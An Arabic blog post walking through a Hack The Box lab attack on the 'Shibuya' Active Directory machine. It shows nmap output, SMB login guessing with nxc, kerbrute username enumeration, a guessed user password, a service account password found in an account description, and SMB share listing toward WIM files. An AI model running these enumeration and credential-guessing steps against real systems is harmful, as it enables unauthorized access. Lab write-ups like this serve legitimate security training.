---
layout: post-rtl
author: براء المصطفى
title: حل ماشين Shibuya على منصة Hack the Box
comments: false
---
بسم الله الرحمن الرحيم

السلام عليكم ورحمة الله تعالى وبركاته جميعاً  , معاكم براء المصطفى او 0xcybersoldier
واليوم رح نحل ماشين shibua من منصة hack the box 

![](/assets/img/shibuyaicon.png)

وعلى بركة الله نبدأ

-----------------------------------------------------------------------

بعد لما شغلنا الماشين واخذنا ip address 

```plain
10.129.234.42
```
# فحص البورتات المفتوحة باستخدام nmap 
نستخدم nmap الان 
```bash
sudo nmap -sCV --min-rate=1000  -T5  -p-  10.129.234.42 -Pn -vvvv
[sudo] password for cybersoldier: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 15:40 +0300
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:40
Completed NSE at 15:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:40
Completed NSE at 15:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:40
Completed NSE at 15:40, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:40
Completed Parallel DNS resolution of 1 host. at 15:40, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:40
Scanning 10.129.234.42 [65535 ports]
Discovered open port 135/tcp on 10.129.234.42
Discovered open port 139/tcp on 10.129.234.42
Discovered open port 3389/tcp on 10.129.234.42
Discovered open port 22/tcp on 10.129.234.42
Discovered open port 53/tcp on 10.129.234.42
Discovered open port 445/tcp on 10.129.234.42
Discovered open port 139/tcp on 10.129.234.42
Discovered open port 53/tcp on 10.129.234.42
Discovered open port 445/tcp on 10.129.234.42
Discovered open port 22/tcp on 10.129.234.42
Discovered open port 49664/tcp on 10.129.234.42
Discovered open port 51147/tcp on 10.129.234.42
Discovered open port 51740/tcp on 10.129.234.42
Discovered open port 593/tcp on 10.129.234.42
SYN Stealth Scan Timing: About 15.51% done; ETC: 15:44 (0:02:49 remaining)
Discovered open port 49669/tcp on 10.129.234.42
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.62% done; ETC: 15:44 (0:02:04 remaining)
Discovered open port 51757/tcp on 10.129.234.42
SYN Stealth Scan Timing: About 48.97% done; ETC: 15:44 (0:01:34 remaining)
Discovered open port 88/tcp on 10.129.234.42
Discovered open port 57477/tcp on 10.129.234.42
SYN Stealth Scan Timing: About 64.82% done; ETC: 15:44 (0:01:05 remaining)
Discovered open port 464/tcp on 10.129.234.42
Discovered open port 51725/tcp on 10.129.234.42
SYN Stealth Scan Timing: About 80.07% done; ETC: 15:44 (0:00:37 remaining)
Discovered open port 9389/tcp on 10.129.234.42
Discovered open port 3268/tcp on 10.129.234.42
Discovered open port 3268/tcp on 10.129.234.42
Discovered open port 3269/tcp on 10.129.234.42
Completed SYN Stealth Scan at 15:44, 187.13s elapsed (65535 total ports)
Initiating Service scan at 15:44
Scanning 19 services on 10.129.234.42
Completed Service scan at 15:45, 59.82s elapsed (19 services on 1 host)
NSE: Script scanning 10.129.234.42.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:45
NSE Timing: About 99.96% done; ETC: 15:45 (0:00:00 remaining)
Completed NSE at 15:45, 40.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.                                                                                                                                                                                                       
Initiating NSE at 15:45                                                                                                                                                                                                                     
Completed NSE at 15:45, 4.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:45
Completed NSE at 15:45, 0.01s elapsed
Nmap scan report for 10.129.234.42
Host is up, received user-set (0.16s latency).
Scanned at 2026-10-03 15:40:59 +03 for 291s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-03 12:43:45Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Issuer: commonName=shibuya-AWSJPDC0522-CA/domainComponent=shibuya
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2026-10-03T12:29:54
| Not valid after:  2027-10-03T12:29:54
| MD5:     5229 1f5a aa86 f572 9cd1 9039 cea0 5dcf
| SHA-1:   a10c 4697 2f1c 7c2c 2433 5344 7c8b 8530 3c63 c5ac
| SHA-256: 9d5d 41c1 84fd 88b8 e37c 4d7e 9234 1067 e687 ab44 d5a0 6074 31b9 dbd0 a513 6a68
| -----BEGIN CERTIFICATE-----
| MIIHUjCCBTqgAwIBAgITIwAAAANvvxHGgr7xFgAAAAAAAzANBgkqhkiG9w0BAQ0F
| ADBOMRIwEAYKCZImiZPyLGQBGRYCdmwxFzAVBgoJkiaJk/IsZAEZFgdzaGlidXlh
| MR8wHQYDVQQDExZzaGlidXlhLUFXU0pQREMwNTIyLUNBMB4XDTI2MTAwMzEyMjk1
| NFoXDTI3MTAwMzEyMjk1NFowITEfMB0GA1UEAxMWQVdTSlBEQzA1MjIuc2hpYnV5
| YS52bDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMI012+m4w1xpJHT
| 4r9ltZH70IV5hFMLjazhqP6yGetjP0KxjDVy0A4wBZ8Ny4yi0ndF1tPdPgLDewMw
| FSZTMgcvSlYKxuxGjyobs17egDWGhG1qBqnCbvR+yfUBtXKWHsx+wBfRNjE5XB//
| bNrVxHMKATBedryQieZaz2oMVg6BeUxZYLCDDrjuZUn6f7SmOfDRA5OK1HmZdOGN
| coz7sFO5AbUjR69cN6/advs8hEh4HyIqI9BsTXYlnd0Z7kK+DRKovvNTVTDyVkBG
| VOcYHgbAxGb4b2URbzQdURgMdeqJDiu1vW+xK0p34vqxkbRHklyt6K11MIP+8ink
| rwq50b0CAwEAAaOCA1QwggNQMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4A
| QwBvAG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUH
| AwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwIC
| AgCAMA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsG
| CWCGSAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYD
| VR0OBBYEFKZ1k1ddwp95lPbmgJRxVtVYytMcMB8GA1UdIwQYMBaAFCzjRoHfuTtp
| jt20d8ArgsWOOQj4MIHXBgNVHR8Egc8wgcwwgcmggcaggcOGgcBsZGFwOi8vL0NO
| PXNoaWJ1eWEtQVdTSlBEQzA1MjItQ0EsQ049QVdTSlBEQzA1MjIsQ049Q0RQLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9c2hpYnV5YSxEQz12bD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgccGCCsGAQUF
| BwEBBIG6MIG3MIG0BggrBgEFBQcwAoaBp2xkYXA6Ly8vQ049c2hpYnV5YS1BV1NK
| UERDMDUyMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGlidXlhLERDPXZsP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MEIGA1UdEQQ7MDmgHwYJKwYBBAGCNxkBoBIEEKx5OE1J+zFCjiPfBfWRnFyCFkFX
| U0pQREMwNTIyLnNoaWJ1eWEudmwwTAYJKwYBBAGCNxkCBD8wPaA7BgorBgEEAYI3
| GQIBoC0EK1MtMS01LTIxLTg3NTYwMDk1LTg5NDQ4NDgxNS0zNjUyMDE1MDIyLTEw
| MDAwDQYJKoZIhvcNAQENBQADggIBAB7/Jg1gZfBGH6JD2Na9tJFkqsl1zeitkQIO
| 6LH1qjDzZ0C5sJgUK6OErdYKcQbYtVs2NGT53DUUJO6z2ndVCiwv/h1na/68bLML
| KYFy90RMRYq90jyi78rGcmHDYIKnUM81fnDsu6GCcKTN/hDJMad3bf1F2RB6Fmlq
| ZNfi1NL7ZDOrfAVZwPUYM9s6x1tgUwzuYSDY1wEiz5+XMLHw8I7SU3OCLwJvZbUr
| vO3R68sjxcRAS5mJDssIsEu13ylw2T5FPNebSu5BCKQwarZ9jWPzcxgnBy3s4hUR
| yBMtMbQ8aPkBPWeupNxTQ1lxaDRMAWsXq36ZllWjhvqH8+Ec67PWZxUC3UQYP2SA
| 9VX8j0XOo9NlP4X7u7kkq40n5+y+yYJ/tMzGnROve8ZWVCRW8zxJuQfX0S233VfO
| WOiPkYXAHIo8oHfzczLhCkL8jFoLVrzPQqwUHl/YoisXGlAck82AzLloqcJov4j8
| qlEZztf4og7vrdBtLJSU6niJlAlQNzZ8lEDPyFYnABJ4gKTjTt4ReFYUBfwf3RzH
| kx4DZsxu/5eAzHJEv2D01GD6tV78/QW6fm/upl8f6S31P3I1NV30ONAEs/kUUiXK
| SmPSrSNkftrepc39PEe66PLG4M6zrl7gZ8bu0t/+Azp7ZqLwIHKznxXp0fcsYeoh
| DXEi5ku5
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Issuer: commonName=shibuya-AWSJPDC0522-CA/domainComponent=shibuya
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2026-10-03T12:29:54
| Not valid after:  2027-10-03T12:29:54
| MD5:     5229 1f5a aa86 f572 9cd1 9039 cea0 5dcf
| SHA-1:   a10c 4697 2f1c 7c2c 2433 5344 7c8b 8530 3c63 c5ac
| SHA-256: 9d5d 41c1 84fd 88b8 e37c 4d7e 9234 1067 e687 ab44 d5a0 6074 31b9 dbd0 a513 6a68
| -----BEGIN CERTIFICATE-----
| MIIHUjCCBTqgAwIBAgITIwAAAANvvxHGgr7xFgAAAAAAAzANBgkqhkiG9w0BAQ0F
| ADBOMRIwEAYKCZImiZPyLGQBGRYCdmwxFzAVBgoJkiaJk/IsZAEZFgdzaGlidXlh
| MR8wHQYDVQQDExZzaGlidXlhLUFXU0pQREMwNTIyLUNBMB4XDTI2MTAwMzEyMjk1
| NFoXDTI3MTAwMzEyMjk1NFowITEfMB0GA1UEAxMWQVdTSlBEQzA1MjIuc2hpYnV5
| YS52bDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMI012+m4w1xpJHT
| 4r9ltZH70IV5hFMLjazhqP6yGetjP0KxjDVy0A4wBZ8Ny4yi0ndF1tPdPgLDewMw
| FSZTMgcvSlYKxuxGjyobs17egDWGhG1qBqnCbvR+yfUBtXKWHsx+wBfRNjE5XB//
| bNrVxHMKATBedryQieZaz2oMVg6BeUxZYLCDDrjuZUn6f7SmOfDRA5OK1HmZdOGN
| coz7sFO5AbUjR69cN6/advs8hEh4HyIqI9BsTXYlnd0Z7kK+DRKovvNTVTDyVkBG
| VOcYHgbAxGb4b2URbzQdURgMdeqJDiu1vW+xK0p34vqxkbRHklyt6K11MIP+8ink
| rwq50b0CAwEAAaOCA1QwggNQMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4A
| QwBvAG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUH
| AwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwIC
| AgCAMA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsG
| CWCGSAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYD
| VR0OBBYEFKZ1k1ddwp95lPbmgJRxVtVYytMcMB8GA1UdIwQYMBaAFCzjRoHfuTtp
| jt20d8ArgsWOOQj4MIHXBgNVHR8Egc8wgcwwgcmggcaggcOGgcBsZGFwOi8vL0NO
| PXNoaWJ1eWEtQVdTSlBEQzA1MjItQ0EsQ049QVdTSlBEQzA1MjIsQ049Q0RQLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9c2hpYnV5YSxEQz12bD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgccGCCsGAQUF
| BwEBBIG6MIG3MIG0BggrBgEFBQcwAoaBp2xkYXA6Ly8vQ049c2hpYnV5YS1BV1NK
| UERDMDUyMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGlidXlhLERDPXZsP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MEIGA1UdEQQ7MDmgHwYJKwYBBAGCNxkBoBIEEKx5OE1J+zFCjiPfBfWRnFyCFkFX
| U0pQREMwNTIyLnNoaWJ1eWEudmwwTAYJKwYBBAGCNxkCBD8wPaA7BgorBgEEAYI3
| GQIBoC0EK1MtMS01LTIxLTg3NTYwMDk1LTg5NDQ4NDgxNS0zNjUyMDE1MDIyLTEw
| MDAwDQYJKoZIhvcNAQENBQADggIBAB7/Jg1gZfBGH6JD2Na9tJFkqsl1zeitkQIO
| 6LH1qjDzZ0C5sJgUK6OErdYKcQbYtVs2NGT53DUUJO6z2ndVCiwv/h1na/68bLML
| KYFy90RMRYq90jyi78rGcmHDYIKnUM81fnDsu6GCcKTN/hDJMad3bf1F2RB6Fmlq
| ZNfi1NL7ZDOrfAVZwPUYM9s6x1tgUwzuYSDY1wEiz5+XMLHw8I7SU3OCLwJvZbUr
| vO3R68sjxcRAS5mJDssIsEu13ylw2T5FPNebSu5BCKQwarZ9jWPzcxgnBy3s4hUR
| yBMtMbQ8aPkBPWeupNxTQ1lxaDRMAWsXq36ZllWjhvqH8+Ec67PWZxUC3UQYP2SA
| 9VX8j0XOo9NlP4X7u7kkq40n5+y+yYJ/tMzGnROve8ZWVCRW8zxJuQfX0S233VfO
| WOiPkYXAHIo8oHfzczLhCkL8jFoLVrzPQqwUHl/YoisXGlAck82AzLloqcJov4j8
| qlEZztf4og7vrdBtLJSU6niJlAlQNzZ8lEDPyFYnABJ4gKTjTt4ReFYUBfwf3RzH
| kx4DZsxu/5eAzHJEv2D01GD6tV78/QW6fm/upl8f6S31P3I1NV30ONAEs/kUUiXK
| SmPSrSNkftrepc39PEe66PLG4M6zrl7gZ8bu0t/+Azp7ZqLwIHKznxXp0fcsYeoh
| DXEi5ku5
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Issuer: commonName=AWSJPDC0522.shibuya.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-02T12:39:02
| Not valid after:  2027-04-03T12:39:02
| MD5:     cb8f 5ba6 311f 991d 71ab f074 1c82 04eb
| SHA-1:   41f9 c648 ecc5 e0ba 5fa6 bbcb 754d 5f0b 790e 398f
| SHA-256: 0d1d 62df 9967 f7e8 778e 6dac 4846 57b0 364b 35d5 a0c1 35fb 0476 fe00 d6e1 d52b
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQMNz/Vw/8V6BAvxS9dNVI6zANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZBV1NKUERDMDUyMi5zaGlidXlhLnZsMB4XDTI2MTAwMjEyMzkw
| MloXDTI3MDQwMzEyMzkwMlowITEfMB0GA1UEAxMWQVdTSlBEQzA1MjIuc2hpYnV5
| YS52bDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANuMyMP0oHI9wOy2
| uU1puMBJ5BYIlupBuzae+GFvEckwoFelsxIWii0+ENaJaQ5BFOSkFWplx+MM8jik
| rQC4gVixZM1gNZm31rPe66HVTDwjupx83+DBaQrMp6ByBVHwgEIx5+8IwjHfGzdT
| ksPHzim45u6qK8F/M833pxbEk2WVaP8gv3rFATkWWxXDNufDjdkDYYhLTqy7y8uP
| z/zcjKKcNU3JSEKlNkTNemMH8Rlst54haHklHUfX07v95hBOV5YNxbtZeyjnqkZp
| XffPZ3THUcMb09LzX1Ue0CIaxEFSMPuiPQ8AppFTfixuN12W9djIo/ULqQ5BhJFX
| TTSDntkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQCstVRaThcvmv/DU9ksoXcCiZGcKYxTwkchdpIp
| VIGdnOwKXXPWZIql3MYD1iiMEMl9eBziY8tIoo2p62aMbC5l18xDgE2wCLOBdd0N
| 09ddQPi3Ead7oKhd7XZvMmg12Jo14rWeNvVDmeGM0foVHc+LUZ3EgxBLmvsTrqqU
| zGdhZ0fHdpEKKqxtdNFMBuIbuN5J4RS+CsyefPabqnZq49v9SxlnHfhMCUdT4hZ8
| mIpxkmoRudGfV8kC4aii0VhFssRK1bBcsiwIAXK8Kzm7mq2IOJSv4x65M6vMQkQV
| 0IwMJeV//0JY90pPjdUF1QeohLR9YG+DNWbKxxIvAGfUnu4h
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-03T12:45:19+00:00; -28s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-10-03T12:44:40+00:00
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51147/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51725/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51740/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51757/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57477/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 65218/tcp): CLEAN (Timeout)
|   Check 2 (port 58196/tcp): CLEAN (Timeout)
|   Check 3 (port 22528/udp): CLEAN (Timeout)
|   Check 4 (port 11882/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -28s, deviation: 0s, median: -28s
| smb2-time: 
|   date: 2026-10-03T12:44:40
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:45
Completed NSE at 15:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:45
Completed NSE at 15:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:45
Completed NSE at 15:45, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.39 seconds
           Raw packets sent: 196699 (8.655MB) | Rcvd: 273 (21.769KB)
```
# محاولة تخمين  تسجيل دخول بمعلومات ضعيفة 

رح نستخدم nxc عشان تخمين على بروتوكول smb 

```bash
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                                                                                           
┌──(cybersoldier㉿kali)-[~]
└─$ nxc smb 10.129.234.42 -u ''  -p ''   
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\: 
                                                                                                                                                                                                                                           
┌──(cybersoldier㉿kali)-[~]
└─$ nxc smb 10.129.234.42 -u ''  -p ''  --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\: 
SMB         10.129.234.42   445    AWSJPDC0522      [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                           
┌──(cybersoldier㉿kali)-[~]
└─$ nxc smb 10.129.234.42 -u 'anonymous'  -p ''  --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\anonymous: STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                           
┌──(cybersoldier㉿kali)-[~]
└─$ nxc smb 10.129.234.42 -u 'anonymous'  -p 'anonymous'  --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\anonymous:anonymous STATUS_LOGON_FAILURE 
```
# اضافة الip address الى ملف /etc/hosts 
 عن طريق هاد الامر 

 ```bash
 echo "10.129.234.42 AWSJPDC0522.shibuya.vl shibuya.vl" | sudo tee -a /etc/hosts
 ```

# تخمين اسماء على مستوى Active directory Domain 

رح نستخدم اداة اسمها kerbrute  عشان نسوي عملية brute force  للاسماء من خلال wordlist
```bash
/opt/Kerbrute/kerbrute  userenum  -d shibuya.vl --dc AWSJPDC0522.shibuya.vl  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/03/26 - Ronnie Flathers @ropnop

2026/10/03 15:56:29 >  Using KDC(s):
2026/10/03 15:56:29 >   AWSJPDC0522.shibuya.vl:88

2026/10/03 15:56:35 >  [+] VALID USERNAME:       purple@shibuya.vl
2026/10/03 15:56:43 >  [+] VALID USERNAME:       red@shibuya.vl
```
والنتيجة عرفنا انه في اسمين يوزرين اسماءهم 
```plain
purple
red
```
منقدر نخمن انه المستخدم حط نفس  اسمه على الباسوورد 
```bash
nxc smb shibuya.vl -u red -p red -k
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
```
# محاولة نشوف شو بقدر يسوي red  على smb 

منقدر نشوف عن طريق nxc smb مع خيار --shares 

```bash
nxc smb shibuya.vl -u red -p red -k --shares 
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
SMB         shibuya.vl      445    AWSJPDC0522      [*] Enumerated shares
SMB         shibuya.vl      445    AWSJPDC0522      Share           Permissions            Remark
SMB         shibuya.vl      445    AWSJPDC0522      -----           -----------            ------
SMB         shibuya.vl      445    AWSJPDC0522      ADMIN$                                 Remote Admin
SMB         shibuya.vl      445    AWSJPDC0522      C$                                     Default share
SMB         shibuya.vl      445    AWSJPDC0522      images$                                
SMB         shibuya.vl      445    AWSJPDC0522      IPC$            READ                   Remote IPC
SMB         shibuya.vl      445    AWSJPDC0522      NETLOGON        READ                   Logon server share 
SMB         shibuya.vl      445    AWSJPDC0522      SYSVOL          READ                   Logon server share 
SMB         shibuya.vl      445    AWSJPDC0522      users           READ                   
```
محاولة الدخول اليه موجود 
```bash

impacket-smbclient -k shibuya.vl/red:red@AWSJPDC0522.shibuya.vl

Then, inside the impacket-smbclient interactive prompt:
use users
ls
```
ولكن بيعطينا access_denid 

# محاولة الحصول على اسماء مستخدمين بشكل اعمق
باستخدام مسختدم red  رح نحاول ناخذ يوزرات اكثر على مستوى الdomain  كامل 

```bash
nxc smb shibuya.vl -u red -p red -k --users
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red
SMB         shibuya.vl      445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         shibuya.vl      445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
SMB         shibuya.vl      445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         shibuya.vl      445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
SMB         shibuya.vl      445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0
<SNIP>
```
> في يوزرات كثيرة فيعني رح اختصر جزئية من النتائج 

لقينا من الوصف تبع اليوزر svc_autojoin
الباسوورد 
svc_autojoin: K5&A6Dw9d8jrKWhV


# استخراج hashes من ملفات wim 

ما هو  WIM file (Windows Imaging Format) ??

هي ملفات من الويندوز او يعني ملفات احتياطي تنعمل عشان ننشىء او تعديل  ملفات الويندوز  و كمان منقدر نستعملها عشان ننشىء نسخ احتياطية من الويندوز 

منقدر نفوت على smb share  ومن لاقي هناك wim files منسحبهم ومنحطهم على /mnt  ومنعطيهم الصلاحيات وبعدين على impacket-secretsdump 
```bash
impacket-smbclient -k shibuya.vl/svc_autojoin:'K5&A6Dw9d8jrKWhV'@AWSJPDC0522.shibuya.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
Type help for list of commands
# use images
[-] SMB SessionError: code: 0xc00000cc - STATUS_BAD_NETWORK_NAME - {Network Name Not Found} The specified share name cannot be found on the remote server.
# use images$
# ls
drw-rw-rw-          0  Wed Feb 19 20:35:20 2025 .
drw-rw-rw-          0  Wed Apr  9 03:09:45 2025 ..
-rw-rw-rw-    8264070  Wed Feb 19 20:35:20 2025 AWSJPWK0222-01.wim
-rw-rw-rw-   50660968  Wed Feb 19 20:35:20 2025 AWSJPWK0222-02.wim
-rw-rw-rw-   32065850  Wed Feb 19 20:35:20 2025 AWSJPWK0222-03.wim
